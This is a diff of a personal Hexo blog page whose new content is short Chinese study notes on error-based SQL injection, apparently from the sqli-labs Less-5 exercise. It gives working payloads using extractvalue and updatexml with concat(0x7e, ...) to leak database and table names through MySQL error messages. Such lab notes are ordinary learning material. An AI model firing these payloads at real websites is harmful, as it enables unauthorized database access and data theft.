@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——小站首页 | Hexo</title>
+  <title>我的技术与生活——报错注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——小站首页`
+    document.title = `我的技术与生活——报错注入`
   </script>
 <meta name="generator" content="Hexo 7.3.0"></head>
 
@@ -344,128 +344,128 @@
     </div>
   </div>
 </div></div>
-      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/archive.css" />
+      <div id="main-container" class="main-container">
 
 
+  <link rel="stylesheet" href="/css/partial/article.css" />
 
-    <div class="archive">
-        <h1 class="archive-title">我の博客归档记录</h1>
-        <ul class="archive-list">
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">报错注入</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
             
-                <li class="archive-list__year">
-                    <h2>2024年</h2>
-                    <ul>
-                        
-                            <li class="archive-list__month">
-                                <h3>第08の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/">How to build up a blog site using Hexo and Guithub Pages</a>
-                                                <span>08月21日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                            <li class="archive-list__month">
-                                <h3>第09の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2024/09/28/hello-world/">Hello World</a>
-                                                <span>09月28日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2024/09/15/虚拟机搭建/">虚拟机搭建</a>
-                                                <span>09月15日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                    </ul>
-                </li>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
             
-                <li class="archive-list__year">
-                    <h2>2025年</h2>
-                    <ul>
-                        
-                            <li class="archive-list__month">
-                                <h3>第10の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/05/php/">php</a>
-                                                <span>10月05日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/05/post型union/">post型union</a>
-                                                <span>10月05日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/10/sql/">sql</a>
-                                                <span>10月10日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/04/union注入/">union注入</a>
-                                                <span>10月04日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/10/报文/">报文</a>
-                                                <span>10月10日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/04/报错注入/">报错注入</a>
-                                                <span>10月04日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                            <li class="archive-list__month">
-                                <h3>第09の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/09/19/VScode/">VScode</a>
-                                                <span>09月19日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                    </ul>
-                </li>
-            
-        </ul>
+          </div>
+          
+          <p class="article-info--date">日期：2025-10-04 18:36:08</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
     </div>
+    <article class="article-content markdown-body">
+      <p>原因：后台对于输入输出的合理性没有做检查，导致返回报错中包含数据库中的内容<br><img src="https://github.com/Lin060807/images/raw/main/Less-5.png" alt="Less-5"></p>
+<h2 id="extractValue-查询内容-查询路径-报错注入"><a href="#extractValue-查询内容-查询路径-报错注入" class="headerlink" title="extractValue(查询内容,查询路径)报错注入"></a>extractValue(查询内容,查询路径)报错注入</h2><p>通过添加“～”让其报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())))</span><br></pre></td></tr></table></figure>
+
+<p>?id&#x3D;1’ union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))–+</p>
+<p>之后在select后面更换输入想要查询的东西</p>
+<p><img src="https://github.com/Lin060807/images/raw/main/Less-5(1).png" alt="Less-5"></p>
+<h2 id="updatexml-查询对象，查询路径，替换数据-报错注入"><a href="#updatexml-查询对象，查询路径，替换数据-报错注入" class="headerlink" title="updatexml(查询对象，查询路径，替换数据)报错注入"></a>updatexml(查询对象，查询路径，替换数据)报错注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select database())),3)--+</span><br></pre></td></tr></table></figure>
+
+<p>之后查库名，表名，列名更换select后面的部分</p>
+<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>concat():合并字符<br>0x7e：～<br>substring(要查询的字符，开始位置，查询个数):从第00个字符开始显示30个字符，可以解决只能返回32个字符的问题(加在sclect后面)</p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2025/10/04/报错注入/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#extractValue-%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9-%E6%9F%A5%E8%AF%A2%E8%B7%AF%E5%BE%84-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">extractValue(查询内容,查询路径)报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml-%E6%9F%A5%E8%AF%A2%E5%AF%B9%E8%B1%A1%EF%BC%8C%E6%9F%A5%E8%AF%A2%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%9B%BF%E6%8D%A2%E6%95%B0%E6%8D%AE-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">updatexml(查询对象，查询路径，替换数据)报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">补充：</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2025/10/05/post型union/">post型union</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2025/10/04/union注入/">union注入</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2025/10/04/报错注入/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
 </div>
       <div class="main-right-wrapper"><div class="main-right">
   <div class="main-right--board">
